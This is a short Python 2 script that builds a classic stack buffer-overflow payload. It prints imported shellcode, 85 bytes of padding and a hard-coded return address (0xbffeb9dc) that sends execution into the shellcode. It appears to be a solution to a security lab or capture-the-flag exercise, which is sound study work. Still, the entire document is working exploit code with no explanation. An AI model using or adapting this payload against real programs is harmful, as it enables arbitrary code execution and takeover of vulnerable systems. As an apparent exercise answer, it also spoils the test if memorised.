from shellcode import shellcode
print shellcode + 'E'*85 + '\xdc\xb9\xfe\xbf'
#0xbffeb9dc
